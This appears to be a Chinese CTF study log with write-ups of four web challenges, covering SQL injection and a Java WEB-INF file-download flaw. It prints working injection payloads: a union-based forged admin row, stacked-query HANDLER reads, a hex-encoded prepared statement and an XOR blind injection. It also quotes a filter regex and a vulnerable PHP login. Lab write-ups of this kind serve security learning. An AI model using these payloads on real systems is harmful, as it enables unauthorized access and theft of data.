#  [GXYCTF2019]BabySQli
sql注入，先随便输一个，返回密码错误，但是发现源码中有一段加密字符
![](assets/Day%205/file-20251223124539623.png)
base32+base64解密：
```sql
select * from user where username = '$name'
```
是sql语句，尝试了group by爆出列数,3列，但是union注入的时候，只会反回`wrong user
本来想尝试报错注入，但是小括号被过滤了。
想盲注，但是and这些也被过滤了。试了异或这些，还是不行。感觉应该不会是这么复杂吧，不太会就看了wp
这脑洞太大了

1. 首先也是判断列数
2. 然后注意到账号为admin时回显`wrong pass!`，而账号不是admin时回显`wrong user!`，加上告诉我们的sql语句中也不是查询同时满足账号密码的就登录，所以猜测查询逻辑是，先根据账号查询，返回数据中有密码，再比对输入的密码和查询到的密码。类似这样
```php

$name = $_POST['name'];
$password = $_POST['pw'];
$sql = "select * from user where username = '".$name."'";   
// echo $sql;
$result = mysqli_query($con, $sql);      
$arr = mysqli_fetch_row($result);
// print_r($arr);
if($arr[1] == "admin"){
	if(md5($password) == $arr[2]){
		echo $flag;
	}else{
			die("wrong pass!");
		}
}else{
		die("wrong user!");
	 }
}

   ```
3. 然后我们可以通过union注入去注出三个回显位哪个是`username`，发现是第二个![500](assets/Day%205/file-20251223132656505.png)
4. 然后在利用union查询的特性，我们可以伪造查询结果，就拿我自己的数据库举例![400](assets/Day%205/file-20251223133050855.png)
   这里就是我们伪造了最后一条记录上去了，同样这里题目我们也可以伪造一条admin账户的查询结果，混淆正确密码，但是这个md5加密一下我是真的想不到，不过也算是契合实际吧，算是经验了。
5. payload：
```http
?name=admi'union select 1,'admin','202cb962ac59075b964b07152d234b70'--+&pw=123

# 这里'202cb962ac59075b964b07152d234b70'是'123'的md5加密，
```
就是伪造了一个admin的密码，然后密码输入123就好了。
# [GYCTF2020]Blacklist
sql注入
过滤了；
```php
return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);
```
   因为过滤了select所以要绕一下，绕过select的方法我知道的有三中，回顾一下：
   1. 预处理语句
就是用16进制字符串的形式把sql语句预处理之后再调用，就像这样
```http
?inject=-1';SeT@a=73656c656374202a2066726f6d20466c616748657265;prepare execsql from @a;execute execsql;#

# 这里'73656c656374202a2066726f6d20466c616748657265'是16进制的'select * from FlagHere'
```
但是这样就需要用到`prepare`，`execsql`，`execute`，`set`等关键字，这里还是被过滤了
2. 改表
这个适用页面可以直接查询其他表的时候，我们可以把我们需要的表改为页面查询的表，这样就可以直接查，但是这里并不适用
3. hadler语句代替select
这个方法也是一种查询方法，可以一行行查询
```sql
handler '表名' open;  /  handler '表名' open as '别名'; --打开
handler '表名' read first;  --读取第一行
handler '表名' read next;  --读取下一行（要先读取第一行）

--还可以：
handler '表名' read first/next limit 10；--显示下面10行或者从开始数的10行

handler '表名' close；  --释放空间
```

所以我们这里可以用hadler语法查询
首先我们通过堆叠注入查询一下表：
```http
?inject=1'show+tables;--+
```
![500](assets/Day%205/file-20251223140522438.png)
这里就确定了表名，接下来就用hadler直接查询:
```http
?inject=1';handler+FlagHere+open+as+a;handler+a+read+first--+
```
![500](assets/Day%205/file-20251223140422361.png)
# [RoarCTF 2019]Easy Java
进去是登录框，查看源码发现一个路由，疑似文件读取
`Download?filename=help.docx`
![](assets/Day%205/file-20251223141554696.png)
每台接触过java题，所以不知道该怎么做，所以看wp了。[WEB-INF文件夹利用](../安全学习/Java安全/WEB-INF文件夹利用.md)
（这里说要改为post传参才能下载文件，不知道为什么？）
我们先看一下`web.xml`
![700](assets/Day%205/file-20251223143401975.png)
找到疑似和flag有关的文件`FlagController`
然后就去看一下对应的class文件
发现一段base64加密，![](assets/Day%205/file-20251223143714532.png)
解码得到flag（也可以去反编译一下）
```java
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

import java.io.IOException;
import java.io.PrintWriter;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet(
    name = "FlagController"
)
public class FlagController extends HttpServlet {
    String flag = "ZmxhZ3tjY2Y4MjY5Yi02YThkLTQzYTQtOWNlMi1hY2E1NTIxY2UxMzl9Cg==";

    protected void doGet(HttpServletRequest var1, HttpServletResponse var2) throws ServletException, IOException {
        PrintWriter var3 = var2.getWriter();
        var3.print("<h1>Flag is nearby ~ Come on! ! !</h1>");
    }
}

```

# [CISCN2019 华北赛区 Day2 Web1]Hack World
简单fuzz一下，发现and，空格，or这些好像都过滤了，但是盲注的一些函数没有，像ascii，substr这些都在
所以我们可以打布尔盲注，并且告诉了我们flag所在的表和列
这里and or过滤了我们就用异或`^`，这个是一真一假就为真。所以我们前面的要为假，我们设为0
```http
id = 0^((substr((select(flag)from(flag)),1,1))='f')
```
